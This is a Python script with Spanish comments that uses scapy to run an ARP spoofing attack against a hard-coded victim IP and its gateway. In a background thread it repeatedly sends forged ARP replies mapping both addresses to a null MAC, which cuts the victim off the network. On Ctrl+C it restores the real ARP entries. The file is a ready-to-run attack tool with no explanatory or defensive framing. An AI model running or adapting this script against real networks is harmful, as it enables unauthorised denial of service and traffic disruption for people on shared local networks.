from scapy.all import ARP, Ether, send, srp, getmacbyip, conf
import time
import threading
import signal
import sys

# Configuración de scapy para suprimir advertencias
conf.verb = 0

# Configuración
IP_VICTIMA = "192.168.101.70"
IP_GATEWAY = "192.168.101.1"
INTERVALO_ATAQUE = 2  # Segundos entre cada paquete
MAC_FALSA = "00:00:00:00:00:00"  # MAC inválida

# Variables globales para control de hilos
ataque_activo = True

def obtener_mac(ip):
    """Obtiene la dirección MAC de una IP usando ARP"""
    try:
        return getmacbyip(ip)
    except:
        return None

def restaurar_arp():
    """Envía respuestas ARP genuinas para restaurar la conexión"""
    print("\nRestaurando tablas ARP...")
    
    mac_victima = obtener_mac(IP_VICTIMA)
    mac_gateway = obtener_mac(IP_GATEWAY)
    
    if mac_victima and mac_gateway:
        # Restaurar víctima
        send(ARP(op=2, pdst=IP_VICTIMA, psrc=IP_GATEWAY, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac_gateway), count=5)
        # Restaurar gateway
        send(ARP(op=2, pdst=IP_GATEWAY, psrc=IP_VICTIMA, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac_victima), count=5)
    else:
        print("Error al obtener MACs para restauración")

def enviar_arp_falso(victima_ip, gateway_ip, mac_falsa):
    """Envía paquetes ARP falsos en ambas direcciones"""
    while ataque_activo:
        try:
            # Envenenar víctima (decirle que el gateway somos nosotros)
            send(ARP(op=2, pdst=victima_ip, psrc=gateway_ip, hwdst=obtener_mac(victima_ip), hwsrc=mac_falsa))
            
            # Envenenar gateway (decirle que la víctima somos nosotros)
            send(ARP(op=2, pdst=gateway_ip, psrc=victima_ip, hwdst=obtener_mac(gateway_ip), hwsrc=mac_falsa))
            
            print(f"Paquetes ARP falsos enviados: {victima_ip} <-> {gateway_ip}")
            time.sleep(INTERVALO_ATAQUE)
            
        except Exception as e:
            print(f"Error: {e}")
            break

def handler_senal(sig, frame):
    """Maneja la señal de interrupción (Ctrl+C)"""
    global ataque_activo
    ataque_activo = False
    restaurar_arp()
    sys.exit(0)


def bloquear_trafico(mac_victima):
    # Configurar handler para Ctrl+C
    signal.signal(signal.SIGINT, handler_senal)

    # Verificar MACs
    mac_gateway = obtener_mac(IP_GATEWAY)

    if not mac_victima or not mac_gateway:
        print("Error: No se pudieron obtener las direcciones MAC necesarias")
        sys.exit(1)

    print(f"Iniciando ataque ARP contra {IP_VICTIMA}")
    print(f"MAC Víctima: {mac_victima}")
    print(f"MAC Gateway: {mac_gateway}")
    print("Presione Ctrl+C para detener y restaurar\n")

    # Iniciar hilo para enviar paquetes ARP falsos
    hilo_ataque = threading.Thread(target=enviar_arp_falso, args=(IP_VICTIMA, IP_GATEWAY, MAC_FALSA))
    hilo_ataque.start()

    # Mantener el hilo principal activo
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        handler_senal(None, None)